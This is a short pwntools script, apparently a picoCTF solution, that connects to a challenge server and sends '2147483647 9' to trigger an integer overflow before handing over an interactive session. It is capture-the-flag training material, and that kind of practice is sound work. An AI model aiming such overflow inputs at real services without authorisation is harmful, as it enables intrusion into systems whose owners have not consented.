#!/usr/bin/python3

from pwn import *

r = remote("saturn.picoctf.net",57915)

r.sendline(b'2147483647 9' )
r.interactive()